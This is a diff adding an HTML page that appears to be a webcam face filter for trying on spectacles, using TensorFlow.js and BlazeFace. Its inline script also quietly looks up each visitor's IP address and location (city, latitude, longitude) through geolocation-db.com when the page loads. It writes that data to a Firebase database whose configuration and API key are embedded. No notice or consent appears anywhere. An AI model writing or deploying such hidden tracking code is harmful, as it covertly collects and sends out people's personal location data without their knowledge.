@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+
+
+</head>
+
+<body>
+
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-analytics.js";
+        import { getFirestore } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js"
+        import { getDatabase, ref, child, push, update } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+        // TODO: Add SDKs for Firebase products that you want to use
+        // https://firebase.google.com/docs/web/setup#available-libraries
+        // let ref = Database.database("https://geo-location-obj-default-rtdb.asia-southeast1.firebasedatabase.app/")
+        // Your web app's Firebase configuration
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+        const firebaseConfig = {
+            apiKey: "AIzaSyDb-PfqeeSs2aQn2yy1CzWzF_b8BpOPWts",
+            authDomain: "geo-location-obj.firebaseapp.com",
+            projectId: "geo-location-obj",
+            storageBucket: "geo-location-obj.appspot.com",
+            messagingSenderId: "126216670809",
+            appId: "1:126216670809:web:63913b6276e189cf2d6b48",
+            measurementId: "G-5RF2J6E4Z6",
+            databaseURL: "https://geo-location-obj-default-rtdb.asia-southeast1.firebasedatabase.app"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const db = getDatabase();
+        // if ("geolocation" in navigator) {
+        //     // Prompt user for permission to access their location
+        //     navigator.geolocation.getCurrentPosition(
+        //         // Success callback function
+        //         (position) => {
+        //             // Get the user's latitude and longitude coordinates
+        //             const lat = position.coords.latitude;
+        //             const lng = position.coords.longitude;
+        //             const postData = {
+        //                 latitude: lat,
+        //                 longitude: lng
+        //             }
+        //             const updates = {}
+        //             const newPostKey = push(child(ref(db), 'location')).key;
+        //             updates['/location/' + newPostKey] = postData;
+        //             update(ref(db), updates);
+        //             // Do something with the location data, e.g. display on a map
+        //             console.log(`Latitude: ${lat}, longitude: ${lng}`);
+        //         },
+        //         // Error callback function
+        //         (error) => {
+        //             // Handle errors, e.g. user denied location sharing permissions
+        //             console.error("Error getting user:", error);
+        //         }
+        //     );
+        // } else {
+        //     // Geolocation is not supported by the browser
+        //     console.error("Geolocation is not supported by this browser.");
+        // }
+        $.getJSON('https://geolocation-db.com/json/')
+            .done(function (location) {
+                // $('#country').html(location.country_name);
+                // $('#state').html(location.state);
+                // $('#city').html(location.city);
+                // $('#latitude').html(location.latitude);
+                // $('#longitude').html(location.longitude);
+                // $('#ip').html(location.IPv4);
+
+                const postData = location
+                const updates = {}
+                const newPostKey = push(child(ref(db), 'location')).key;
+                updates['/location/' + newPostKey] = postData;
+                update(ref(db), updates);
+            });
+    </script>
+    <video id="video" autoplay display="none"></video>
+    <canvas id="canvas" width="638" height="480" style="border:1px solid #d3d3d3;"></canvas> <br> <br>
+
+    <!-- Select spects border color: <input type="color" name="borderclr" id="borderclr"> <br>
+Select spects glass color: <input type="color" name="glassclr" id="glassclr"> -->
+
+</body>
+
+<script src="script.js"></script>
+
+</html>
